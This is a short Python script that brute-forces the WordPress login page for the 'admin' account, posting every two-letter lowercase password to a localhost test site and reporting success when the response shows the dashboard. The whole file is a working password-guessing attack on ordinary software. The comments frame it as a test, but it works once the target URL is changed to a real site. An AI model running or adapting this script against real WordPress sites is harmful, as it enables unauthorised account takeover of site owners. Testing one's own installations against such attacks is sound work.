import requests
from itertools import product
import string
import time

# Target URL (Change to your test site URL)
url = 'http://localhost/testsite/wp-login.php'

# Username for brute force attack
username = 'admin'

# Generate simple passwords (e.g., 2-letter combos for testing)
passwords = [''.join(x) for x in product(string.ascii_lowercase, repeat=2)]

# Start attack
for password in passwords:
    print(f"[*] Trying: {username}:{password}")
    
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': 'http://localhost/testsite/wp-admin',
        'testcookie': '1'
    }
    
    response = requests.post(url, data=data)
    
    if 'dashboard' in response.text:
        print(f"[+] Success! Password found: {password}")
        break
    
    time.sleep(0.5)  # Prevent overwhelming the server
